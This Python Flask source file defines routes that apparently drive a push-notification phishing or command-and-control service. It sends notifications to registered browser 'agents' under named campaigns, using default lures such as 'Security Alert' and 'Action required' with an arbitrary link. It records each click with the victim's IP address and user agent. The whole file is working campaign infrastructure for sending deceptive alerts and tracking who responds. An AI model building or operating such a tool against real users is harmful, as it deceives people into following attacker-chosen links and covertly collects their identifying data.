"""
Command and notification routes
"""
from flask import Blueprint, request, jsonify
from datetime import datetime
import json
from models import db, Agent, Command, Click
from utils.push import send_push_notification
from vapid_keys import VAPID_PRIVATE_KEY, VAPID_CLAIMS

commands_bp = Blueprint('commands', __name__)


@commands_bp.route('/send_notification', methods=['POST'])
def send_notification():
    """Send push notification to agents"""
    try:
        data = request.json
        agent_ids = data.get('agent_ids', [])
        campaign_id = data.get('campaign_id')
        command_type = data.get('type', 'alert')
        title = data.get('title', 'Security Alert')
        message = data.get('message', 'Action required')
        url = data.get('url', '')
        icon = data.get('icon', '/static/img/icon.png')
        
        results = []
        
        for agent_id in agent_ids:
            agent = Agent.query.get(agent_id)
            if not agent:
                continue
            
            # Create command
            command = Command(
                agent_id=agent.id,
                campaign_id=campaign_id,
                command_type=command_type,
                title=title,
                message=message,
                url=url,
                icon=icon
            )
            db.session.add(command)
            db.session.flush()  # Get command.id
            
            # Send push notification
            success = send_push_notification(
                agent=agent,
                command=command,
                title=title,
                message=message,
                url=url,
                icon=icon
            )
            
            if success:
                command.delivered = True
                results.append({
                    'agent_id': agent.id,
                    'status': 'sent',
                    'agent_name': f"{agent.browser} on {agent.os}"
                })
            else:
                results.append({
                    'agent_id': agent.id,
                    'status': 'failed'
                })
        
        db.session.commit()
        
        return jsonify({
            'success': True,
            'results': results,
            'total_sent': len([r for r in results if r['status'] == 'sent'])
        })
        
    except Exception as e:
        print(f"[-] Send notification error: {str(e)}")
        return jsonify({'error': str(e)}), 500


@commands_bp.route('/click/<agent_id>', methods=['POST'])
def track_click(agent_id):
    """Track notification click"""
    try:
        data = request.json
        command_id = data.get('command_id')
        
        print(f"[DEBUG] Click tracking - Agent: {agent_id}, Command ID: {command_id}")
        
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return jsonify({'error': 'Agent not found'}), 404
        
        agent.last_seen = datetime.utcnow()
        
        click = Click(
            agent_id=agent.id,
            command_id=command_id,
            ip_address=request.remote_addr,
            user_agent=request.headers.get('User-Agent')
        )
        db.session.add(click)
        
        if command_id:
            command = Command.query.get(command_id)
            if command:
                command.clicked = True
                print(f"[DEBUG] Command {command_id} marked as clicked")
            else:
                print(f"[DEBUG] Command {command_id} not found!")
        else:
            print(f"[DEBUG] No command_id provided")
        
        db.session.commit()
        
        print(f"[+] Click tracked for agent {agent_id}")
        
        return jsonify({'success': True})
        
    except Exception as e:
        print(f"[-] Click tracking error: {str(e)}")
        return jsonify({'error': str(e)}), 500


@commands_bp.route('/commands', methods=['GET'])
def get_commands():
    """Get all commands"""
    commands = Command.query.order_by(Command.sent_at.desc()).limit(100).all()
    return jsonify([cmd.to_dict() for cmd in commands])
